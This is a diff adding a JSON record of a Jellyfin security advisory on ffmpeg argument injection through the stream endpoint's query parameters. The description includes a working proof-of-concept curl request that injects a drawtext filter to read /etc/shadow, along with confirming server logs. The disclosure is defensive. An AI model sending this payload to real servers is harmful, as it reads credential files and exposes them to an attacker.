@@ -1,0 +1,51 @@
+{
+  "global": null,
+  "id": "GHSA-jh22-fw8w-2v9x",
+  "repo": {
+    "cve_id": "CVE-2026-35033",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-862",
+      "CWE-88"
+    ],
+    "description": "### Impact\r\n\r\nAn incorrect sanitizer in Jellyfin has been discovered that potentially allows an unauthenticated remote arbitrary file read via ffmpeg argument injection through the `StreamOptions` query parameter parsing mechanism. The `ParseStreamOptions` method in `StreamingHelpers.cs` adds any lowercase query parameter to a dictionary without validation, bypassing the `[RegularExpression]` attribute on the `level` controller parameter. The unsanitized value is concatenated directly into the ffmpeg command line as `-level <attacker-controlled>`, allowing injection of arbitrary ffmpeg arguments. By injecting a `-vf drawtext=textfile=/etc/shadow` filter, an attacker can read arbitrary server files and exfiltrates their contents as text rendered in the video stream response. The vulnerable `/Videos/{itemId}/stream` endpoint has no `[Authorize]` attribute, making this exploitable without authentication. \r\n\r\n### Patches\r\nThis issue has been fixed in 10.11.7 (and backported to master) via improved sanitization of the affected API endpoint.\r\n\r\n### Workarounds\r\nN/A\r\n\r\n### References\r\n\r\nThis bug was also reported by GHSL team member [@anticomputer (Bas)](https://github.com/anticomputer) (GHSL-2026-053). This was also reported in parallel by [@paul-gerste-sonarsource](https://github.com/paul-gerste-sonarsource) of Sonar.\r\n\r\nThe following single HTTP request (no authentication) reads `/etc/shadow` from the server and returns it embedded in the video stream:\r\n\r\n```bash\r\ncurl -o exfil.ts \\\r\n  'http://<jellyfin>:8096/Videos/<item-guid>/stream?videoCodec=h264&audioCodec=aac&container=ts&allowVideoStreamCopy=false&h264-level=51%20-vf%20drawtext=textfile=/etc/shadow:fontsize=24:fontcolor=white:x=10:y=10:fontfile=/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf&videoBitRate=500000' \\\r\n  -H 'X-Emby-Authorization: MediaBrowser Client=\"PoC\", Device=\"CLI\", DeviceId=\"poc\", Version=\"1.0.0\"'\r\n# Play exfil.ts in any video player to see /etc/shadow contents as text overlay\r\n```\r\n\r\nA self-contained PoC script that sets up a fresh Jellyfin Docker container and demonstrates the full exploit chain is available upon request.\r\n\r\nNote that Item GUIDs are pseudorandom, and require an authenticated user to abuse.\r\n\r\n**Verified ffmpeg command line (from server logs):**\r\n\r\n```\r\n/usr/lib/jellyfin-ffmpeg/ffmpeg -analyzeduration 200M -probesize 1G\r\n  -i file:\"/media/movies/TestMovie/movie.mkv\"\r\n  -map 0:0 -map 0:1 -map -0:s -codec:v:0 libx264\r\n  -force_key_frames \"expr:gte(t,n_forced*5)\"\r\n  -vf \"setparams=color_primaries=bt709:color_trc=bt709:colorspace=bt709,scale=...\"\r\n  -preset superfast -crf 23 -maxrate 85660 -bufsize 171320\r\n  -level 51 -vf drawtext=textfile=/etc/shadow:fontsize=24:fontcolor=white:x=10:y=10:fontfile=...\r\n  -x264opts:0 subme=0:me_range=16:rc_lookahead=10:me=hex:open_gop=0\r\n  -map_metadata -1 -map_chapters -1 -threads 0 -codec:a:0 copy\r\n  -y \"/cache/transcodes/7b85282b52758b455782d671297fd634.ts\"\r\n```\r\n\r\n**ffmpeg confirms the filter replacement:**\r\n\r\n```\r\n[vost#0:0/libx264] Multiple -filter/-af/-vf options specified for stream 0,\r\n  only the last option '-filter:v drawtext=textfile=/etc/shadow:...' will be used.\r\n```\r\n",
+    "ghsa_id": "GHSA-jh22-fw8w-2v9x",
+    "html_url": "https://github.com/jellyfin/jellyfin/security/advisories/GHSA-jh22-fw8w-2v9x",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-jh22-fw8w-2v9x"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-35033"
+      }
+    ],
+    "published_at": "2026-04-14T21:13:59Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Potential SSRF + Arbitrary file read via stream argument injection",
+    "updated_at": "2026-04-15T02:07:22Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": ""
+        },
+        "patched_versions": "10.11.7",
+        "vulnerable_version_range": "<10.11.7"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "jellyfin/jellyfin"
+}
